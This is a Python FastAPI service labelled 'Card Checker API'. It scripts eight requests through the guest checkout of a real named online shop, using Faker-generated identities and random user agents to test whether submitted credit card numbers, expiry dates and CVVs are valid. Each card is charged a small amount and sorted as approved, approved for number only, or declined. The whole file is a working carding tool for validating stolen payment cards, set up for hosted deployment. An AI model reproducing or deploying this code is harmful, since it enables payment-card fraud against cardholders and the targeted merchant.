import re
import asyncio
from typing import Optional, Tuple
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import httpx
from fake_useragent import FakeUserAgent
from faker import Faker
import os

app = FastAPI()

class CardRequest(BaseModel):
    card: str

def splitter(text: str, start: str, end: str) -> str:
    try:
        start_index = text.index(start) + len(start)
        end_index = text.index(end, start_index)
        return text[start_index:end_index]
    except ValueError:
        return ""

def parse_card(
    card: str, month_length: int = 2, year_length: int = 4
) -> Optional[Tuple[str, str, str, str]] | Optional[str]:
    parts = re.split(r"\\D+", card.strip())[:4]
    if len(parts) < 4:
        return "Invalid length (4 parts needed)."

    try:
        num, month, year, cvv = map(int, parts)
        if month_length not in (1, 2):
            return "Invalid month length."
        if year_length not in (2, 4):
            return "Invalid year length."

        month_str = str(month).zfill(month_length)
        year_str = str(year)

        if len(month_str) not in (1, 2):
            return "Invalid card month."
        if len(year_str) not in (2, 4):
            return "Invalid card year."

        if len(year_str) == 2 and year_length == 4:
            year_str = str(2000 + year)
        elif len(year_str) == 4 and year_length == 2:
            year_str = year_str[-2:]

        return (str(num), month_str, year_str, str(cvv))

    except ValueError:
        return None

def card_type(card_num):
    num = "".join(filter(str.isdigit, str(card_num)))
    if num[0] == "4":
        return "VISA"
    elif num[0] == "5":
        return "MasterCard"
    elif num[:2] in ["34", "37"]:
        return "AMEX"
    elif num[:4] == "6011" or num[:2] == "65":
        return "DISCOVER"
    else:
        return "CARD TYPE"

async def payflow(card: tuple):
    card_num = card[0]
    card_mm = card[1]
    card_yy = card[2]
    card_cvn = card[3]
    card_t = card_type(card_num)

    user_agent = str(FakeUserAgent().random)
    fake = Faker()
    first_name = fake.first_name()
    last_name = fake.last_name()
    phone = fake.numerify(text="###-###-####")
    email = fake.email(True, "gmail.com")
    street_address = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()
    postal_code = fake.postalcode()

    async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as session:
        try:
            # REQ 1
            resp = await session.post(
                "https://www.bluescentric.com/ActionService.asmx/AddToCart",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json",
                    "origin": "https://www.bluescentric.com",
                    "priority": "u=1, i",
                    "referer": "https://www.bluescentric.com/p-556-14-in-mono-male-to-35mm-stereo-female-adapter.aspx",
                    "user-agent": user_agent,
                    "x-requested-with": "XMLHttpRequest",
                },
                json={
                    "sProductId": 556,
                    "sVariantId": 559,
                    "sCartType": 0,
                    "sQuantity": "1",
                    "colorOptions": "",
                    "sizeOptions": "",
                },
            )
            if resp.status_code != 200:
                return {"status": "error", "message": f"ERROR IN REQUEST 1: {resp.status_code}."}
            print("REQ 1 Done.")
        except Exception as e:
            return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 1: {e}"}

        try:
            # REQ 2
            resp = await session.get(
                "https://www.bluescentric.com/shoppingcart.aspx",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "priority": "u=0, i",
                    "referer": "https://www.bluescentric.com/p-556-14-in-mono-male-to-35mm-stereo-female-adapter.aspx",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
            )
            if resp.status_code != 200:
                return {"status": "error", "message": f"ERROR IN REQUEST 2: {resp.status_code}."}

            viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
            viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
            print("REQ 2 Done.")
        except Exception as e:
            return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 2: {e}"}

        try:
            # REQ 3
            resp = await session.post(
                "https://www.bluescentric.com/shoppingcart.aspx",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.bluescentric.com",
                    "priority": "u=0, i",
                    "referer": "https://www.bluescentric.com/shoppingcart.aspx",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
                data={
                    "__EVENTTARGET": "",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__EVENTVALIDATION": eventvalidation,
                    "ctl00$ctrlPageSearch$SearchText": "",
                    "ctl00$PageContent$ctrlShoppingCart$ctl00$ctl01": "1",
                    "ctl00$PageContent$txtPromotionCode": "",
                    "ctl00$PageContent$hidCouponCode": "",
                    "ctl00$PageContent$OrderNotes": "",
                    "ctl00$PageContent$btnCheckout": "Checkout Now",
                },
            )
            if resp.status_code != 200:
                return {"status": "error", "message": f"ERROR IN REQUEST 3: {resp.status_code}."}

            viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
            viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
            print("REQ 3 Done.")
        except Exception as e:
            return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 3: {e}"}

        try:
            # REQ 4
            resp = await session.post(
                "https://www.bluescentric.com/checkoutanon.aspx?checkout=true",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.bluescentric.com",
                    "priority": "u=0, i",
                    "referer": "https://www.bluescentric.com/checkoutanon.aspx?checkout=true",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
                data={
                    "__EVENTTARGET": "",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__EVENTVALIDATION": eventvalidation,
                    "ctl00$ctrlPageSearch$SearchText": "",
                    "ctl00$PageContent$EMail": "",
                    "ctl00$PageContent$Password": "",
                    "ctl00$PageContent$Skipregistration": "Checkout As Guest",
                },
            )
            if resp.status_code != 200:
                return {"status": "error", "message": f"ERROR IN REQUEST 4: {resp.status_code}."}

            viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
            viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
            print("REQ 4 Done.")
        except Exception as e:
            return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 4: {e}"}

        try:
            # REQ 5
            resp = await session.post(
                "https://www.bluescentric.com/createaccount.aspx?checkout=true&skipreg=true",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.bluescentric.com",
                    "priority": "u=0, i",
                    "referer": "https://www.bluescentric.com/createaccount.aspx?checkout=true&skipreg=true",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
                data={
                    "__EVENTTARGET": "ctl00$PageContent$btnContinueCheckout",
                    "__EVENTARGUMENT": "",
                    "__LASTFOCUS": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__EVENTVALIDATION": eventvalidation,
                    "ctl00$ctrlPageSearch$SearchText": "",
                    "ctl00$PageContent$txtAnonEmail": email,
                    "ctl00$PageContent$Offers": "rbAnonOffersNo",
                    "ctl00$PageContent$ctrlBillingAddress$FirstName": first_name,
                    "ctl00$PageContent$ctrlBillingAddress$LastName": last_name,
                    "ctl00$PageContent$ctrlBillingAddress$Phone": phone,
                    "ctl00$PageContent$ctrlBillingAddress$Address1": street_address,
                    "ctl00$PageContent$ctrlBillingAddress$Address2": "",
                    "ctl00$PageContent$ctrlBillingAddress$City": city,
                    "ctl00$PageContent$ctrlBillingAddress$Country": "United States",
                    "ctl00$PageContent$ctrlBillingAddress$State": state,
                    "ctl00$PageContent$ctrlBillingAddress$Zip": postal_code,
                    "ctl00$PageContent$cbBillIsShip": "on",
                    "ctl00$PageContent$ctrlShippingAddress$FirstName": first_name,
                    "ctl00$PageContent$ctrlShippingAddress$LastName": last_name,
                    "ctl00$PageContent$ctrlShippingAddress$Phone": phone,
                    "ctl00$PageContent$ctrlShippingAddress$Address1": street_address,
                    "ctl00$PageContent$ctrlShippingAddress$Address2": "",
                    "ctl00$PageContent$ctrlShippingAddress$City": city,
                    "ctl00$PageContent$ctrlShippingAddress$Country": "United States",
                    "ctl00$PageContent$ctrlShippingAddress$State": state,
                    "ctl00$PageContent$ctrlShippingAddress$Zip": postal_code,
                    "ctl00$PageContent$hidPagePlacement": "0",
                },
            )
            if resp.status_code != 200:
                return {"status": "error", "message": f"ERROR IN REQUEST 5: {resp.status_code}."}

            viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
            viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
            print("REQ 5 Done.")
        except Exception as e:
            return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 5: {e}"}

        try:
            # REQ 6
            resp = await session.post(
                "https://www.bluescentric.com/checkoutshipping.aspx?dontupdateid=true",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.bluescentric.com",
                    "priority": "u=0, i",
                    "referer": "https://www.bluescentric.com/checkoutanon.aspx?checkout=true",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
                data={
                    "__EVENTTARGET": "",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__EVENTVALIDATION": eventvalidation,
                    "ctl00$ctrlPageSearch$SearchText": "",
                    "ctl00$PageContent$ctrlShippingMethods$ctrlShippingMethods": "6",
                    "ctl00$PageContent$btnContinueCheckout": "Continue Checkout",
                    "ctl00$PageContent$OrderNotes": "",
                },
            )
            if resp.status_code != 200:
                return {"status": "error", "message": f"ERROR IN REQUEST 6: {resp.status_code}."}

            viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
            viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
            print("REQ 6 Done.")
        except Exception as e:
            return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 6: {e}"}

        try:
            # REQ 7
            resp = await session.post(
                "https://www.bluescentric.com/checkoutpayment.aspx?TryToShowPM=CREDITCARD",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.bluescentric.com",
                    "priority": "u=0, i",
                    "referer": "https://www.bluescentric.com/checkoutpayment.aspx?TryToShowPM=CREDITCARD&errormsg=34",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
                data={
                    "__EVENTTARGET": "",
                    "__EVENTARGUMENT": "",
                    "__LASTFOCUS": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__EVENTVALIDATION": eventvalidation,
                    "ctl00$ctrlPageSearch$SearchText": "",
                    "ctl00$PageContent$ctrlPaymentMethod$PaymentSelection": "rbCREDITCARD",
                    "ctl00$PageContent$ctrlCreditCardPanel$ddlCCType": card_t,
                    "ctl00$PageContent$ctrlCreditCardPanel$txtCCName": f"{first_name} {last_name}",
                    "ctl00$PageContent$ctrlCreditCardPanel$txtCCNumber": card_num,
                    "ctl00$PageContent$ctrlCreditCardPanel$ddlCCExpMonth": card_mm,
                    "ctl00$PageContent$ctrlCreditCardPanel$ddlCCExpYr": card_yy,
                    "ctl00$PageContent$ctrlCreditCardPanel$txtCCVerCd": card_cvn,
                    "ctl00$PageContent$txtPromotionCode": "",
                    "ctl00$PageContent$hidCouponCode": "",
                    "ctl00$PageContent$btnContCheckout": "Continue Checkout",
                },
            )
            if resp.status_code != 200:
                return {"status": "error", "message": f"ERROR IN REQUEST 7: {resp.status_code}."}

            viewstate = splitter(resp.text, 'id="__VIEWSTATE" value="', '"')
            viewstategenerator = splitter(resp.text, 'id="__VIEWSTATEGENERATOR" value="', '"')
            eventvalidation = splitter(resp.text, 'id="__EVENTVALIDATION" value="', '"')
            print("REQ 7 Done.")
        except Exception as e:
            return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 7: {e}"}

        try:
            # REQ 8 | LAST REQ
            resp = await session.post(
                "https://www.bluescentric.com/checkoutreview.aspx?paymentmethod=CREDITCARD",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.bluescentric.com",
                    "priority": "u=0, i",
                    "referer": "https://www.bluescentric.com/checkoutpayment.aspx?TryToShowPM=CREDITCARD&errormsg=34",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
                data={
                    "__EVENTTARGET": "ctl00$PageContent$btnContinueCheckout2",
                    "__EVENTARGUMENT": "",
                    "__VIEWSTATE": viewstate,
                    "__VIEWSTATEGENERATOR": viewstategenerator,
                    "__EVENTVALIDATION": eventvalidation,
                    "ctl00$ctrlPageSearch$SearchText": "",
                },
            )
            if resp.status_code != 200:
                return {"status": "error", "message": f"ERROR IN REQUEST 8: {resp.status_code}."}

            error_msg = splitter(resp.text, '_ErrorMsgLabel" class="error">', "<")

            if error_msg == "":
                return {"status": "approved", "message": "Charged $1.75"}
            elif "CVV2" in error_msg:
                return {"status": "approved_ccn", "message": error_msg}
            else:
                return {"status": "declined", "message": error_msg}

        except Exception as e:
            return {"status": "error", "message": f"ERROR WHILE DOING REQUEST 8: {e}"}

@app.post("/card")
async def check_card(request: CardRequest):
    try:
        card = parse_card(request.card)
        
        if not isinstance(card, tuple):
            raise HTTPException(status_code=400, detail=f"ERROR PARSING CARD: {card}")
        
        result = await payflow(card)
        return result
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")

@app.get("/")
async def root():
    return {"message": "Card Checker API is running"}

# Para Render
if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port)
